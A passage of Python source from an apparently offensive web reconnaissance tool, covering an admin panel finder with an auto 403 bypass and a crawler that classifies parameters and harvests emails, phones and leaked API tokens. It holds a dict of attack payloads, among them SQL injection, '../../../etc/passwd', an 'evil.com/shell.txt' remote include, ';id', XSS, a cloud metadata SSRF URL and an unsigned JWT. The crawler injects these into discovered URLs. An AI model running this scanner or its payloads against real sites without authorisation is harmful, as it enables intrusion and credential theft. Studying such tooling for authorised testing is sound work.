        if bl and fm != 'all' and bl.is_false_positive(resp, strict=(fm=='strict')):
            with self._lk:
                self._fp_count = getattr(self, '_fp_count', 0) + 1
            return

        sc = resp.status_code
        size = len(resp.content) if resp.content else 0

        if sc == 200:
            col, tag = C.G, "200 OK"
        elif sc in (301,302,307,308):
            col, tag = C.Y, f"{sc} → {resp.headers.get('Location','?')[:50]}"
        elif sc == 403:
            col, tag = C.M, "403 FORBIDDEN"
        elif sc == 401:
            col, tag = C.Y, "401 UNAUTH"
        elif sc == 405:
            col, tag = C.CY, "405 METHOD"
        else:
            return

        msg = f"  {col}[{tag}]{C.E} [{cat}] {full}  {C.DIM}({size}b){C.E}"
        print(f"\r{' '*80}\r{msg}")
        self.logger.log(f"[ADMIN][{sc}][{cat}] {full}")
        with self._lk:
            self.found.append({"url":full,"status":sc,"tag":tag,"category":cat,"size":size,
                                "server":resp.headers.get("Server","?")})

    def run(self) -> list:
        sep("ADMIN PANEL FINDER")
        self.logger.section("ADMIN FINDER")
        paths = self._paths()
        total = len(paths)
        live_port_extra = sum(1 for cat,_ in paths if cat == "Live Port Panel")
        cat_count = len(self.cats) + (1 if live_port_extra else 0)
        print(f"  Target : {C.CY}{self.url}{C.E}")
        print(f"  Paths  : {C.CY}{total}{C.E} across {C.CY}{cat_count}{C.E} categories"
              + (f"  {C.DIM}(+{live_port_extra} live-port probes){C.E}" if live_port_extra else ""))
        print(f"  Threads: {C.CY}{self.threads}{C.E}\n")

        # ── Baseline fingerprint (before threads) ─────────────────────
        print(f"  {C.DIM}[*] Fingerprinting site behavior ...{C.E}", end="", flush=True)
        baseline = BaselineChecker(self.url, self.engine)
        is_normal = baseline.fingerprint()
        print(f"\r  {C.DIM}[*] Baseline: mode={baseline.mode}{C.E}          ")

        filter_mode = "filter"
        if not is_normal:
            filter_mode = baseline.warn_and_ask("Admin Panel Finder")
            if filter_mode == "abort":
                cprint(C.Y, "  [!] Admin Finder aborted by user.")
                return []
        self._baseline    = baseline
        self._filter_mode = filter_mode

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(self._check, cat, p) for cat,p in paths]
            for _ in concurrent.futures.as_completed(futs):
                bar(self._done, total, len(self.found))
        print()
        if not is_normal:
            fp_count = getattr(self, '_fp_count', 0)
            if fp_count:
                cprint(C.DIM, f"  [baseline] {fp_count} false-positive responses filtered.")

        if self.found:
            sep("RESULTS")
            by_cat: Dict[str,list] = {}
            for r in self.found:
                by_cat.setdefault(r['category'],[]).append(r)
            for cat,items in by_cat.items():
                print(f"\n  {C.Y}[{cat}]{C.E}")
                for r in items:
                    col = C.G if r['status']==200 else C.Y if r['status'] in (301,302,307,308) else C.M
                    print(f"    {col}[{r['status']}]{C.E} {r['url']}")

            forbidden = [r for r in self.found if r['status']==403]
            if forbidden:
                print(f"\n  {C.Y}[?] Found {len(forbidden)} FORBIDDEN (403) paths.{C.E}")
                ans = ask("Run auto bypass on 403 paths? [Y/n]","y").lower()
                if ans == 'y':
                    for r in forbidden:
                        parsed_path = urlparse(r['url']).path
                        bt = BypassTester(self.url, parsed_path, self.logger)
                        bt.run_silent(self.engine)
                        if bt.found:
                            print(f"  {C.G}[BYPASS SUCCESS]{C.E} {r['url']}")
                            self.found.extend(bt.found)

        cprint(C.G, f"\n[✔] Admin Finder: {len(self.found)} results")
        self.logger.save("admin_finder", self.found)
        return self.found


# ══════════
#  MODULE 3 – PROFESSIONAL WEB CRAWLER
# ═══════════
# ── Vulnerability severity map (used by crawler + bug reporter) ───────────────
VULN_SEVERITY: Dict[str, str] = {
    "SQLi":                  "Critical",
    "LFI/Path Traversal":    "Critical",
    "RFI":                   "Critical",
    "Command Injection":     "Critical",
    "XXE / Deserialization": "High",
    "SSRF":                  "High",
    "IDOR / Auth":           "High",
    "File Upload / Import":  "High",
    "XSS":                   "High",
    "SSTI":                  "High",
    "NoSQL Injection":       "High",
    "LDAP Injection":        "High",
    "JWT Issues":            "High",
    "Mass Assignment":       "Medium",
    "Open Redirect":         "Medium",
    "GraphQL":               "Medium",
    "API / Debug Exposure":  "Medium",
    "Command/Code Injection":"Critical",
    "Admin / Config Exposure":"Medium",
}

VULN_PATTERNS = {
    "SQLi": [
        r'[?&][a-z_]+id=\d+', r'[?&]cat=\d+', r'[?&]page=\d+',
        r'[?&]item=\d+', r'[?&]product=\d+', r'[?&]user=\d+',
        r'[?&]order=\d+', r'[?&]num=\d+', r'[?&]pid=\d+',
        r'[?&]cid=\d+', r'[?&]sid=\d+', r'[?&]uid=\d+',
        r'[?&]aid=\d+', r'[?&]gid=\d+', r'[?&]nid=\d+',
        r'[?&]sort=', r'[?&]orderby=', r'[?&]filter=',
        r'\.php\?[a-z_]+=', r'\.asp\?[a-z_]+=', r'\.aspx\?[a-z_]+=',
        r'\.jsp\?[a-z_]+=', r'\.cfm\?[a-z_]+=',
        r'\.do\?[a-z_]+=', r'\.action\?[a-z_]+=',
    ],
    "LFI/Path Traversal": [
        r'[?&]file=', r'[?&]path=', r'[?&]dir=', r'[?&]folder=',
        r'[?&]include=', r'[?&]page=', r'[?&]doc=', r'[?&]document=',
        r'[?&]template=', r'[?&]view=', r'[?&]load=', r'[?&]read=',
        r'[?&]lang=', r'[?&]locale=', r'[?&]module=', r'[?&]action=',
        r'\.\./', r'%2e%2e%2f', r'%252e%252e%252f',
        r'[?&]content=', r'[?&]conf=', r'[?&]config=',
        r'[?&]source=', r'[?&]src=', r'[?&]resource=',
    ],
    "Open Redirect": [
        r'[?&]url=http', r'[?&]redirect=', r'[?&]return=',
        r'[?&]next=', r'[?&]goto=', r'[?&]redir=', r'[?&]forward=',
        r'[?&]location=', r'[?&]back=', r'[?&]continue=',
        r'[?&]returnurl=', r'[?&]return_to=', r'[?&]dest=',
        r'[?&]destination=', r'[?&]target=', r'[?&]to=',
        r'[?&]link=', r'[?&]href=', r'[?&]jump=', r'[?&]out=',
        r'[?&]view=', r'[?&]site=', r'[?&]domain=',
    ],
    "SSRF": [
        r'[?&]url=', r'[?&]uri=', r'[?&]host=', r'[?&]domain=',
        r'[?&]server=', r'[?&]endpoint=', r'[?&]proxy=',
        r'[?&]fetch=', r'[?&]callback=', r'[?&]target=',
        r'[?&]link=', r'[?&]src=', r'[?&]source=', r'[?&]feed=',
        r'[?&]webhook=', r'[?&]img=', r'[?&]image_url=',
        r'[?&]api_url=', r'[?&]service=', r'[?&]resource=',
        r'[?&]load=', r'[?&]request=', r'[?&]ping=',
        r'[?&]redirect=', r'[?&]return=', r'[?&]next=',
        r'[?&]data=', r'[?&]reference=', r'[?&]site=',
    ],
    "XSS": [
        r'[?&]search=', r'[?&]q=', r'[?&]query=', r'[?&]keyword=',
        r'[?&]term=', r'[?&]s=', r'[?&]name=', r'[?&]comment=',
        r'[?&]message=', r'[?&]text=', r'[?&]input=', r'[?&]msg=',
        r'[?&]title=', r'[?&]desc=', r'[?&]description=',
        r'[?&]email=', r'[?&]feedback=', r'[?&]content=',
        r'[?&]body=', r'[?&]subject=', r'[?&]post=', r'[?&]reply=',
        r'[?&]author=', r'[?&]username=', r'[?&]user=', r'[?&]tag=',
        r'[?&]category=', r'[?&]label=', r'[?&]status=',
        r'[?&]error=', r'[?&]success=', r'[?&]alert=',
    ],
    "IDOR / Auth": [
        r'[?&]token=', r'[?&]key=', r'[?&]api_key=', r'[?&]auth=',
        r'[?&]access_token=', r'[?&]secret=', r'[?&]password=',
        r'[?&]session=', r'[?&]sess=', r'[?&]account_id=',
        r'[?&]user_id=', r'[?&]order_id=', r'[?&]invoice=',
        r'[?&]ref=', r'[?&]reset_token=', r'[?&]hash=',
        r'[?&]signature=', r'[?&]verify=', r'[?&]activation=',
        r'[?&]code=', r'[?&]otp=', r'[?&]pin=', r'[?&]security=',
        r'[?&]identity=', r'[?&]profile=', r'[?&]member=',
        r'[?&]customer=', r'[?&]client=', r'[?&]admin=',
    ],
    "File Upload / Import": [
        r'/upload', r'/file-upload', r'/import', r'/media/upload',
        r'/attachments?/upload', r'/import-file', r'/uploadfile',
        r'type="file"', r'enctype="multipart',
        r'/file_upload', r'/upload_file', r'/uploadfile',
        r'/import-file', r'/import_file', r'/importfile',
        r'/bulk-upload', r'/bulk_upload', r'/bulkupload',
        r'/csv-import', r'/csv_import', r'/csvimport',
        r'/xml-import', r'/xml_import', r'/xmlimport',
    ],
    "Admin / Config Exposure": [
        r'/admin', r'/config', r'/setup', r'/install',
        r'/backup', r'/debug', r'\.env', r'\.git',
        r'/console', r'/actuator', r'/manage', r'/_profiler',
        r'/phpinfo', r'/info\.php', r'/server-status',
        r'/server-info', r'/wp-config', r'/configuration',
        r'/settings', r'/environment', r'/variables',
        r'/secrets', r'/credentials', r'/private',
    ],
    "Command/Code Injection": [
        r'[?&]cmd=', r'[?&]exec=', r'[?&]command=', r'[?&]run=',
        r'[?&]ping=', r'[?&]host=.*&cmd', r'[?&]code=', r'[?&]eval=',
        r'[?&]debug=', r'[?&]test=', r'[?&]shell=', r'[?&]system=',
        r'[?&]process=', r'[?&]execute=', r'[?&]invoke=',
        r'[?&]call=', r'[?&]func=', r'[?&]function=',
        r'[?&]method=', r'[?&]procedure=', r'[?&]script=',
    ],
    "XXE / Deserialization": [
        r'\.xml(\?|$)', r'[?&]xml=', r'[?&]data=.*base64',
        r'[?&]serialized=', r'[?&]obj=', r'[?&]payload=',
        r'[?&]deserialize=', r'[?&]unserialize=', r'[?&]serialize=',
        r'[?&]object=', r'[?&]class=', r'[?&]type=',
        r'[?&]format=', r'[?&]output=', r'[?&]template=',
    ],
    "API Version / Debug": [
        r'/api/v\d+', r'/v\d+/', r'[?&]debug=true', r'[?&]test=1',
        r'[?&]verbose=', r'[?&]format=json', r'/internal/',
        r'/private/', r'/staging/', r'/beta/',
        r'/dev/', r'/development/', r'/testing/',
        r'/sandbox/', r'/demo/', r'/experimental/',
        r'/alpha/', r'/preview/', r'/canary/',
        r'/legacy/', r'/old/', r'/new/', r'/v1/', r'/v2/',
    ],
    "GraphQL": [
        r'/graphql', r'/graphiql', r'/gql', r'/query',
        r'[?&]query=', r'[?&]mutation=', r'[?&]subscription=',
        r'[?&]variables=', r'[?&]operationName=',
        r'/graphql/console', r'/graphql/playground',
        r'/graphql/schema', r'/graphql/introspection',
        r'/altair', r'/voyager', r'/apollo',
    ],
    "SSTI": [
        r'[?&]name=.*\{\{', r'[?&]template=.*\{\{',
        r'[?&]content=.*\{\{', r'[?&]message=.*\{\{',
        r'[?&]title=.*\{\{', r'[?&]text=.*\{\{',
        r'[?&]body=.*\{\{', r'[?&]subject=.*\{\{',
        r'\{\{.*\}\}', r'\$\{.*\}', r'<%.*%>',
    ],
    "NoSQL Injection": [
        r'[?&]\$where=', r'[?&]\$ne=', r'[?&]\$gt=', r'[?&]\$lt=',
        r'[?&]\$regex=', r'[?&]\$or=', r'[?&]\$and=',
        r'[?&]\$in=', r'[?&]\$nin=', r'[?&]\$exists=',
        r'[?&]\$type=', r'[?&]\$mod=', r'[?&]\$all=',
        r'[?&]\$size=', r'[?&]\$elemMatch=',
    ],
    "LDAP Injection": [
        r'[?&]dn=', r'[?&]cn=', r'[?&]uid=', r'[?&]ou=',
        r'[?&]filter=', r'[?&]search=', r'[?&]base=',
        r'[?&]scope=', r'[?&]attributes=',
        r'\*\)\(', r'\)\(',
    ],
}

# ── Per-parameter vulnerability map (global, used by _classify_url) ──────────
PARAM_VULN_MAP: Dict[str, List[str]] = {
    "SQLi":                 ["id","uid","pid","cid","sid","gid","aid","nid",
                             "tid","rid","fid","mid","did","wid","idx","no",
                             "nr","row","rec","ref","record","object","entity",
                             "post","news","blog","article","topic","thread",
                             "comment","reply","msg","doc","file","report",
                             "invoice","account","member","order","product",
                             "item","cat","page","num","sort","orderby",
                             "order_by","filter","field","column","dir",
                             "direction","by","group"],
    "LFI/Path Traversal":  ["file","path","dir","folder","include","page",
                             "doc","document","template","view","load","read",
                             "lang","locale","module","content","conf","config",
                             "source","src","resource","layout","component",
                             "section","partial","style","theme","ext","plugin"],
    "RFI":                  ["file","include","page","src","url","load",
                             "template","module"],
    "Command Injection":    ["cmd","exec","command","run","shell","system",
                             "execute","eval","invoke","process","code","func",
                             "call","function","procedure","script","method",
                             "ping","host","ip"],
    "SSRF":                 ["url","uri","src","source","href","action","host",
                             "server","endpoint","webhook","callback","fetch",
                             "proxy","load","resource","remote","request","ip",
                             "addr","address","domain","img_url","image_url",
                             "file_url","doc_url","pdf_url","api_url","service",
                             "feed","import","ping","target","site"],
    "XSS":                  ["search","q","query","keyword","keywords","term",
                             "terms","s","name","fullname","first_name",
                             "last_name","comment","message","text","input",
                             "msg","body","title","subject","desc","description",
                             "email","feedback","content","reply","note",
                             "remark","author","username","user","tag",
                             "category","label","status","error","success",
                             "alert","redirect_msg","flash","notice","info",
                             "warning","display","show","output","format",
                             "callback","jsonp","lang","locale","language",
                             "city","address","region"],
    "Open Redirect":        ["url","redirect","return","next","goto","redir",
                             "forward","dest","destination","target","to","link",
                             "back","continue","returnurl","return_to",
                             "redirect_uri","redirect_url","success_url",
                             "failure_url","cancel_url","nexturl","location",
                             "jump","out","view","site","domain","ref"],
    "IDOR / Auth":          ["id","uid","user_id","userid","account","account_id",
                             "profile","profile_id","order","order_id","invoice",
                             "invoice_id","document","doc_id","message",
                             "message_id","ticket","ticket_id","customer",
                             "customer_id","employee","record","entry","file",
                             "folder","report","task","project","transaction",
                             "payment","contract","subscription","token",
                             "access_token","api_key","auth","key","session",
                             "secret","hash","signature","code","otp","pin",
                             "reset_token","verify_token","activation","confirm"],
    "JWT Issues":           ["token","jwt","bearer","auth"],
    "Mass Assignment":      ["role","is_admin","admin","superuser","permissions",
                             "group","groups","verified","active","balance",
                             "credits","points","level","rank","plan",
                             "subscription"],
    "NoSQL Injection":      ["filter","where","query","search","find","match",
                             "criteria","selector","condition","operator"],
    "LDAP Injection":       ["dn","cn","uid","ou","filter","base","scope",
                             "attributes","ldap","directory"],
    "XXE / Deserialization":["xml","data","serialized","obj","payload",
                             "deserialize","unserialize","serialize","object",
                             "class"],
    "SSTI":                 ["name","template","content","message","title",
                             "text","body","subject","tpl","view"],
    "File Upload / Import": ["file","upload","attachment","import","document",
                             "media"],
}

VULN_TEST_PAYLOADS: Dict[str, str] = {
    "SQLi":                  "' OR '1'='1-- -",
    "LFI/Path Traversal":   "../../../etc/passwd",
    "RFI":                   "http://evil.com/shell.txt",
    "Command Injection":     ";id",
    "XSS":                   "<script>alert(1)</script>",
    "Open Redirect":         "https://evil.com",
    "SSRF":                  "http://169.254.169.254/latest/meta-data/",
    "IDOR / Auth":           "1",
    "SSTI":                  "{{7*7}}",
    "NoSQL Injection":       '{"$gt":""}',
    "LDAP Injection":        "*)(&",
    "JWT Issues":            "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
    "Mass Assignment":       "1",
    "XXE / Deserialization": "FUZZ_XXE",
    "File Upload / Import":  "FUZZ_UPLOAD",
}

class WebCrawler:
    def __init__(self, url, engine: Engine, logger: Logger,
                 max_depth=3, threads=None):
        self.start   = url.rstrip('/')
        self.engine  = engine
        self.logger  = logger
        self.depth   = max_depth
        self.threads = threads or engine.threads
        self._base   = urlparse(url).netloc
        self._scheme = urlparse(url).scheme

        self.visited  : Set[str] = set()
        self.internal : Set[str] = set()
        self.external : Set[str] = set()
        self.emails   : Set[str] = set()
        self.phones   : Set[str] = set()
        self.js_files : Set[str] = set()
        self.css_files: Set[str] = set()
        self.forms    : List[dict] = []
        self.comments : List[str] = []
        self.vuln_urls: Dict[str, List[dict]] = {k:[] for k in VULN_PATTERNS}
        self.params_found: List[dict] = []
        self.sensitive: List[str] = []

        self.images   : Set[str] = set()
        self.gifs     : Set[str] = set()
        self.videos   : Set[str] = set()
        self.audio    : Set[str] = set()
        self.documents: Set[str] = set()
        self.archives : Set[str] = set()

        self._lk      = threading.Lock()

    MEDIA_EXT = {
        "image": {".jpg",".jpeg",".png",".webp",".svg",".bmp",".ico",".avif",".tiff"},
        "gif":   {".gif"},
        "video": {".mp4",".webm",".mov",".avi",".mkv",".flv",".m3u8",".ts"},
        "audio": {".mp3",".wav",".ogg",".m4a",".flac",".aac"},
        "doc":   {".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".csv",".txt",".rtf"},
        "arch":  {".zip",".rar",".7z",".tar",".gz",".tar.gz",".bz2"},
    }

    def _bucket_media(self, url: str) -> bool:
        path = urlparse(url).path.lower()
        for kind, exts in self.MEDIA_EXT.items():
            if any(path.endswith(e) for e in exts):
                with self._lk:
                    if kind == "image":   self.images.add(url)
                    elif kind == "gif":   self.gifs.add(url)
                    elif kind == "video": self.videos.add(url)
                    elif kind == "audio": self.audio.add(url)
                    elif kind == "doc":   self.documents.add(url)
                    elif kind == "arch":  self.archives.add(url)
                return True
        return False

    def _internal(self, url: str) -> bool:
        h = urlparse(url).netloc
        return h == self._base or h.endswith('.'+self._base)


    def _classify_url(self, url: str):
        """Classify a URL for vulnerability patterns — per-param analysis."""
        parsed = urlparse(url)
        qs     = parsed.query
        if not qs:
            # Still check URL path patterns (no-param patterns)
            for vtype, patterns in VULN_PATTERNS.items():
                for pat in patterns:
                    if re.search(pat, url, re.I):
                        with self._lk:
                            entry = {"url": url, "param": None,
                                     "type": vtype, "pattern": pat,
                                     "severity": VULN_SEVERITY.get(vtype,"Medium")}
                            if not any(e["url"]==url and e["type"]==vtype
                                      for e in self.vuln_urls.get(vtype,[])):
                                self.vuln_urls.setdefault(vtype,[]).append(entry)
                        break
            return

        params = parse_qs(qs, keep_blank_values=True)
        if params:
            with self._lk:
                entry = {"url": url, "params": list(params.keys())}
                if entry not in self.params_found:
                    self.params_found.append(entry)

        # Per-param vulnerability matching
        for param_name, values in params.items():
            pname_lower = param_name.lower()
            value       = values[0] if values else ""

            for vtype, param_list in PARAM_VULN_MAP.items():
                if pname_lower in param_list:
                    severity = VULN_SEVERITY.get(vtype, "Medium")
                    # Build test URL with payload
                    test_payload = VULN_TEST_PAYLOADS.get(vtype, "FUZZ")
                    # Rebuild URL with payload injected into this param
                    new_params = dict(parse_qs(qs, keep_blank_values=True))
                    new_params[param_name] = [test_payload]
                    test_qs  = "&".join(f"{k}={v[0]}" for k,v in new_params.items())
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_qs}"
                    with self._lk:
                        entry = {
                            "url":      url,
                            "param":    param_name,
                            "value":    value[:40] if value else "",
                            "type":     vtype,
                            "severity": severity,
                            "test_url": test_url,
                        }
                        existing = self.vuln_urls.setdefault(vtype, [])
                        if not any(e["url"]==url and e["param"]==param_name
                                  for e in existing):
                            existing.append(entry)
                    break  # one match per param per vuln type is enough

        # Also run the regex patterns on full URL for path-based detection
        for vtype, patterns in VULN_PATTERNS.items():
            for pat in patterns:
                if re.search(pat, url, re.I):
                    with self._lk:
                        existing = self.vuln_urls.setdefault(vtype, [])
                        if not any(e["url"]==url and e.get("param") is None
                                  for e in existing):
                            existing.append({
                                "url": url, "param": None,
                                "type": vtype, "pattern": pat,
                                "severity": VULN_SEVERITY.get(vtype,"Medium"),
                                "test_url": url,
                            })
                    break

    @staticmethod
    def _is_sane_url(url: str) -> bool:
        """Return False for logically useless URLs before queuing/classifying."""
        try:
            p = urlparse(url)
            if p.scheme not in ('http', 'https'):
                return False
            if not p.netloc:
                return False
            path  = p.path  or '/'
            query = p.query or ''

            # ── Block: /?filename.ext (file as bare query param, no = sign) ──
            # e.g. /?index.php, /?page.html, /?file.asp — useless
            if path in ('/', '') and query and '=' not in query:
                if re.search(r'\.[a-zA-Z0-9]{2,5}$', query.split('&')[0]):
                    return False

            # ── Block: double-slash in path ──────────────────────────────────
            if '//' in path:
                return False

            # ── Block: trailing ? with no query ──────────────────────────────
            if url.endswith('?') or url.endswith('/?'):
                return False

            # ── Block: javascript: / mailto: / data: leaking through ─────────
            if url.startswith(('javascript:', 'mailto:', 'data:', 'tel:', 'void(')):
                return False

            # ── Block: empty fragment / anchor-only links ─────────────────────
            if url == '#' or url.startswith('#'):
                return False

            return True
        except Exception:
            return False

    @staticmethod
    def _normalise_url(url: str) -> str:
        """Strip fragment, normalise trailing slash, decode %20 etc."""
        try:
            p = urlparse(url)
            # Drop fragment (never meaningful for crawling)
            clean = p._replace(fragment='')
            # Remove duplicate query-string separators
            result = clean.geturl()
            return result.rstrip('?&')
        except Exception:
            return url

    def _extract(self, url: str, html: str):
        soup = BeautifulSoup(html, 'html.parser')

        for tag in soup.find_all('a', href=True):
            raw  = tag['href'].strip()
            if not raw or raw.startswith(('#','javascript:','mailto:','tel:')):
                continue
            href = self._normalise_url(urljoin(url, raw))
            if not href.startswith('http'):
                continue
            if not self._is_sane_url(href):
                continue
            if self._bucket_media(href):
                continue
            if self._internal(href):
                with self._lk:
                    is_new = href not in self.internal
                    self.internal.add(href)
                if is_new:
                    self._classify_url(href)
            else:
                with self._lk:
                    self.external.add(href)

        for tag in soup.find_all('img'):
            for attr in ('src','data-src','data-original','data-lazy-src'):
                v = tag.get(attr)
                if v:
                    full = urljoin(url, v)
                    if full.startswith('http'):
                        if not self._bucket_media(full):
                            with self._lk: self.images.add(full)
            srcset = tag.get('srcset','')
            if srcset:
                for part in srcset.split(','):
                    cand = part.strip().split(' ')[0]
                    if cand:
                        full = urljoin(url, cand)
                        if full.startswith('http'):
                            self._bucket_media(full)

        for tag in soup.find_all('source'):
            src = tag.get('src') or tag.get('srcset','').split(' ')[0]
            if src:
                full = urljoin(url, src)
                if full.startswith('http'):
                    self._bucket_media(full)

        for tag in soup.find_all(['video','audio']):
            src = tag.get('src')
            if src:
                full = urljoin(url, src)
                if full.startswith('http'): self._bucket_media(full)
            poster = tag.get('poster')
            if poster:
                full = urljoin(url, poster)
                if full.startswith('http'):
                    with self._lk: self.images.add(full)

        for tag in soup.find_all(['embed','object']):
            src = tag.get('src') or tag.get('data')
            if src:
                full = urljoin(url, src)
                if full.startswith('http'): self._bucket_media(full)

        for tag in soup.find_all(style=True):
            for m in re.finditer(r'url\((["\']?)(.*?)\1\)', tag['style']):
                full = urljoin(url, m.group(2))
                if full.startswith('http'): self._bucket_media(full)

        for tag in soup.find_all('script'):
            src = tag.get('src','')
            if src:
                full = urljoin(url, src)
                if full.startswith('http'):
                    with self._lk: self.js_files.add(full)
            if tag.string:
                found = re.findall(r'["\']([/][a-zA-Z0-9_\-/\.]+["\'])', tag.string)
                for f in found:
                    f = f.strip('"\'')
                    full = urljoin(url, f)
                    if self._bucket_media(full):
                        continue
                    if self._internal(full):
                        with self._lk: self.internal.add(full)

        for tag in soup.find_all('link', href=True):
            rel = ' '.join(tag.get('rel',[]))
            href = urljoin(url, tag['href'])
            if 'stylesheet' in rel and href.startswith('http'):
                with self._lk: self.css_files.add(href)
            elif 'icon' in rel and href.startswith('http'):
                with self._lk: self.images.add(href)

        for form in soup.find_all('form'):
            action = urljoin(url, form.get('action',''))
            fdata = {
                "page": url, "action": action,
                "method": form.get('method','GET').upper(),
                "inputs": [],
                "has_file_upload": False,
            }
            for inp in form.find_all(['input','textarea','select']):
                t = inp.get('type','text')
                if t == 'file': fdata['has_file_upload'] = True
                fdata['inputs'].append({
                    "name": inp.get('name',''),
                    "type": t, "id": inp.get('id',''),
                    "placeholder": inp.get('placeholder',''),
                })
            with self._lk: self.forms.append(fdata)

        found_emails = re.findall(
            r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,7}', html)
        with self._lk: self.emails.update(found_emails)

        found_phones = re.findall(
            r'(?:\+?\d[\d\s\-\(\)]{7,}\d)', html)
        with self._lk: self.phones.update(found_phones[:50])

        raw_comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
        for c in raw_comments:
            c = c.strip()
            if len(c) > 5 and len(c) < 500:
                with self._lk:
                    if c not in self.comments:
                        self.comments.append(c)

        sens_pats = [
            r'(?i)(api[_\-]?key|api[_\-]?secret|access[_\-]?token|secret[_\-]?key)\s*[=:]\s*["\']([^"\']{8,})["\']',
            r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']([^"\']{4,})["\']',
            r'(?i)(aws_access_key_id|aws_secret_access_key)\s*[=:]\s*["\']([^"\']+)["\']',
            r'(?i)(private[_\-]?key|rsa[_\-]?key)[^"\']*["\']([^"\']{10,})["\']',
            r'(?i)Bearer\s+([a-zA-Z0-9\-_]{20,})',
            r'(?i)(mongodb|mysql|postgres|redis|amqp|ftp)://[^\s"\']+',
            r'(?i)(AKIA[0-9A-Z]{16})',
            r'(?i)(sk_live_[0-9a-zA-Z]{24,})',
            r'(?i)(ghp_[0-9a-zA-Z]{36})',
            r'(?i)(xox[baprs]-[0-9a-zA-Z\-]+)',
        ]
        for pat in sens_pats:
            for m in re.finditer(pat, html):
                entry = f"[LEAK] {url} → {m.group(0)[:100]}"
                with self._lk:
                    if entry not in self.sensitive:
                        self.sensitive.append(entry)

        for m in re.finditer(r'(?:href|src|action|url|endpoint|api)\s*[=:]\s*["\']([^"\']+)["\']', html, re.I):
            href = m.group(1)
            if href.startswith('/') or href.startswith('http'):
                full = urljoin(url, href)
                if self._internal(full):
                    with self._lk: self.internal.add(full)

    def _crawl(self, url: str, depth: int) -> list:
        with self._lk:
            if url in self.visited: return []
            self.visited.add(url)
        if depth > self.depth: return []

        resp = self.engine.get(url)
        if not resp: return []
        ct = resp.headers.get('Content-Type','')
        if resp.status_code not in range(200,400): return []
        if 'html' not in ct and 'javascript' not in ct: return []

        # ── Baseline false-positive check ────────────────────────────
        bl = getattr(self, '_baseline', None)
        fm = getattr(self, '_filter_mode', 'filter')
        if bl and fm != 'all' and bl.is_false_positive(resp, strict=(fm=='strict')):
            with self._lk:
                self._dupe_count = getattr(self, '_dupe_count', 0) + 1
            return []

        # ── Content deduplication (spider-trap / pagination traps) ───
        page_hash = hashlib.md5(resp.content).hexdigest()
        with self._lk:
            ph_set = getattr(self, '_page_hashes', set())
            if page_hash in ph_set:
                self._dupe_count = getattr(self, '_dupe_count', 0) + 1
                return []
            ph_set.add(page_hash)
            self._page_hashes = ph_set

        sc_col = C.G if resp.status_code==200 else C.Y
        print(f"\r{' '*90}\r  {sc_col}[{resp.status_code}]{C.E} {C.DIM}{url[:80]}{C.E}")
        self.logger.log(f"[CRAWL][{resp.status_code}] {url}")
        self._extract(url, resp.text)

        nxt = []
        with self._lk:
            for link in list(self.internal):
                if link not in self.visited and self._is_sane_url(link):
                    nxt.append((link, depth+1))
        return nxt

    def run(self) -> dict:
        sep("WEB CRAWLER")
        self.logger.section("WEB CRAWLER")
        print(f"  Target : {C.CY}{self.start}{C.E}")
        print(f"  Depth  : {C.CY}{self.depth}{C.E}  Threads: {C.CY}{self.threads}{C.E}\n")

        # ── Baseline fingerprint ──────────────────────────────────────
        print(f"  {C.DIM}[*] Fingerprinting site (soft-404 / catch-all detection) ...{C.E}",
              end="", flush=True)
        self._baseline     = BaselineChecker(self.start, self.engine)
        self._filter_mode  = "filter"
        self._page_hashes  : Set[str] = set()   # content dedup
        self._dupe_count   = 0
        is_normal = self._baseline.fingerprint()
        print(f"\r  {C.DIM}[*] Site mode: {self._baseline.mode}{C.E}              ")

        if not is_normal:
            choice = self._baseline.warn_and_ask("Web Crawler")
            if choice == 'abort':
                cprint(C.Y, "  [!] Crawler aborted by user.")
                return {}
            self._filter_mode = choice

        queue = [(self.start, 0)]
        while queue:
            batch = queue[:self.threads]
            queue = queue[self.threads:]
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                results = list(ex.map(lambda x: self._crawl(*x), batch))
            seen_in_queue = {u for u,_ in queue}
            for nxt_links in results:
                for link, d in nxt_links:
                    if link not in self.visited and link not in seen_in_queue:
                        queue.append((link, d))
                        seen_in_queue.add(link)

        sep("CRAWLER RESULTS")
        dupe_c = getattr(self, '_dupe_count', 0)
        mode_c = getattr(self, '_filter_mode', 'filter')
        if dupe_c:
            cprint(C.DIM, f"  [baseline/dedup] {dupe_c} duplicate/false-positive pages skipped"
                   + (f" (mode: {mode_c})" if mode_c != 'filter' else ""))
        print(f"  Pages Crawled  : {C.CY}{len(self.visited)}{C.E}")
        print(f"  Internal Links : {C.CY}{len(self.internal)}{C.E}")
        print(f"  External Links : {C.CY}{len(self.external)}{C.E}")
        print(f"  JS Files       : {C.CY}{len(self.js_files)}{C.E}")
        print(f"  CSS Files      : {C.CY}{len(self.css_files)}{C.E}")
        print(f"  Forms          : {C.G}{len(self.forms)}{C.E}")
        print(f"  Emails         : {C.G}{len(self.emails)}{C.E}")
        print(f"  Comments       : {C.G}{len(self.comments)}{C.E}")
        if self.sensitive:
            print(f"  {C.R}Potential Leaks: {len(self.sensitive)}{C.E}")

        print(f"\n  {C.Y}Media:{C.E}  "
              f"Images:{len(self.images)}  GIFs:{len(self.gifs)}  "
              f"Videos:{len(self.videos)}  Audio:{len(self.audio)}  "
              f"Docs:{len(self.documents)}  Archives:{len(self.archives)}")

        # ── Bug Report ─────────────────────────────────────────────────
        total_vuln = sum(len(v) for v in self.vuln_urls.values())
        total_with_param = sum(
            1 for items in self.vuln_urls.values()
            for i in items if i.get("param"))

        if total_vuln:
            sep("BUG-HUNT REPORT")
            sev_order = {"Critical":0,"High":1,"Medium":2,"Low":3}
            # Flatten all findings sorted by severity
            all_findings = []
            for vtype, items in self.vuln_urls.items():
                for item in items:
                    all_findings.append(item)
            all_findings.sort(key=lambda x: sev_order.get(x.get("severity","Medium"),9))

            # Count per severity
            crits = [f for f in all_findings if f.get("severity")=="Critical"]
            highs = [f for f in all_findings if f.get("severity")=="High"]
            meds  = [f for f in all_findings if f.get("severity")=="Medium"]
            lows  = [f for f in all_findings if f.get("severity")=="Low"]

